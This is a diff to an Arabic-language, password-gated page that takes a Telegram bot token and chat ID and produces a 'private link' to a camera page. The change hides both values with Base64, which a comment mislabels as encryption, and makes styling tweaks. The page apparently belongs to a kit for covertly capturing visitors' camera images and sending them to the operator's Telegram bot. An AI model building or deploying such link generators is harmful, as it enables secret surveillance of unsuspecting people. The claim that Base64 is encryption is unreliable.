@@ -7,7 +7,7 @@
     <style>
         body {
             font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #ff416c, #ff4b2b);
+            background: linear-gradient(135deg, #6a11cb, #2575fc);
             color: white;
             text-align: center;
             margin: 0;
@@ -55,7 +55,7 @@
             padding: 10px 20px;
             font-size: 1.2em;
             color: white;
-            background: #ff4b2b;
+            background: #2575fc;
             border: none;
             border-radius: 5px;
             cursor: pointer;
@@ -63,7 +63,7 @@
         }
 
         button:hover {
-            background: #ff6f61;
+            background: #5d8ffc;
         }
 
         .hidden {
@@ -80,6 +80,19 @@
             font-size: 0.9em;
             color: #eee;
         }
+
+        .result {
+            margin-top: 20px;
+            padding: 10px;
+            background: rgba(0, 0, 0, 0.6);
+            border-radius: 5px;
+            word-wrap: break-word;
+        }
+
+        a {
+            color: #00ffff;
+            text-decoration: none;
+        }
     </style>
 </head>
 <body>
@@ -92,7 +105,7 @@
             <p id="error-message" class="error hidden">كلمة المرور غير صحيحة!</p>
         </div>
         <div id="form-container" class="hidden">
-            <form id="info-form" onsubmit="generateLink(event)">
+            <form id="info-form" onsubmit="generateEncryptedLink(event)">
                 <label for="token">أدخل التوكن:</label>
                 <input type="password" id="token" placeholder="توكن البوت" required>
                 
@@ -101,7 +114,7 @@
                 
                 <button type="submit">إنشاء الرابط</button>
             </form>
-            <p id="result" class="hidden"></p>
+            <div id="result" class="result hidden"></div>
         </div>
     </div>
     <footer>© 2024 - إعداد تطبيق الكاميرا</footer>
@@ -120,14 +133,25 @@
             }
         }
 
-        function generateLink(event) {
+        function encryptData(data) {
+            // تشفير بسيط باستخدام Base64
+            return btoa(unescape(encodeURIComponent(data)));
+        }
+
+        function generateEncryptedLink(event) {
             event.preventDefault();
             const token = document.getElementById("token").value;
             const chatId = document.getElementById("chat-id").value;
 
-            const baseUrl = "https://sportsore.github.io/Cam/";
-            const link = `${baseUrl}?token=${encodeURIComponent(token)}&chat_id=${encodeURIComponent(chatId)}`;
+            // دمج البيانات وتشفيرها
+            const data = JSON.stringify({ token, chat_id: chatId });
+            const encryptedData = encryptData(data);
 
+            // إنشاء الرابط المشفر
+            const baseUrl = "main.html";
+            const link = `${baseUrl}?data=${encodeURIComponent(encryptedData)}`;
+
+            // عرض الرابط للمستخدم
             const result = document.getElementById("result");
             result.innerHTML = `<strong>رابطك الخاص:</strong> <a href="${link}" target="_blank">${link}</a>`;
             result.classList.remove("hidden");
